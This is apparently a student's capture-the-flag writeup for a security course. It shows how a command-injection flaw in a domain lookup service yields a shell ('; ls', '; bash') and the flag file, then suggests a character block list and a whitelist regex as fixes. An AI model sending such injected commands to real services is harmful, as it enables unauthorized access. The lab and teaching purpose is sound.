## Assignment Writeup

### Part 1 (40 pts)

I did:

nc 1337bank.money 1337

This gave me a prompt:

Give me a domain or IP to look up:

So this is the server asking for something to presumable run on its command line. I tried to give it its own IP address and website, but this did nothing.

I searched online on how to do command line injection, and you can use ; or & or && to precede your command to run it as another command and ignore the first command. I entered:

    ; ls

This seemed to work, as it gave me a folder list.

Now I tried:

    ; bash

This let me freely have my own shell right there and I could do whatever I wanted in that shell. I played around for a bit.

Then to find the flag, I did:

    find . -name '*.txt'

This showed me that the file was in .home/flag.txt

    cd home

    less flag.txt

`less` didn't work, so I did:

    cat flag.txt

Then I got:
>CMSC389R-{d1gging_f0r_flag5_thr0ugh_1njec7ion}

To prevent command line injection, v0idcache could add input validation for what people can enter. So it would first check the input and not run the command if it contains these characters:

> & |  ; $ > < ` \ !

Another way would be to use a whitelist regex so that it would only accept 1-20 letters and numbers characters:

    ^[a-z0-9]{1,20}$
